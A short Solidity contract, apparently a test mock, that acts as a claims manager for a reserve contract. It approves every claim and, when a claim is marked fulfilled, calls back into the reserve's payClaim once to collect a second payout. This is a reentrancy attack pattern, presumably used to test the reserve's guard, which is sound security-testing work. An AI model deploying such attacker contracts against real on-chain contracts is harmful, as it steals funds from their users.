// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract ReentrancyAttacker {
    address public reserve;
    IERC20 public token;
    uint256 public attackCount;

    constructor(address _reserve) {
        reserve = _reserve;
    }

    function isClaimApproved(uint256, address, uint256) external pure returns (bool) {
        return true;
    }

    function markClaimFulfilled(uint256 claimId) external {
        // Try to re-enter payClaim
        attackCount++;
        if (attackCount < 2) {
            // Re-enter
            (bool success,) = reserve.call(
                abi.encodeWithSignature(
                    "payClaim(uint256,address,uint256)",
                    claimId + 1,
                    address(this),
                    100 * 10**6
                )
            );
        }
    }

    function hasPendingClaims() external pure returns (bool) {
        return false;
    }

    // Accept ETH
    receive() external payable {}
}
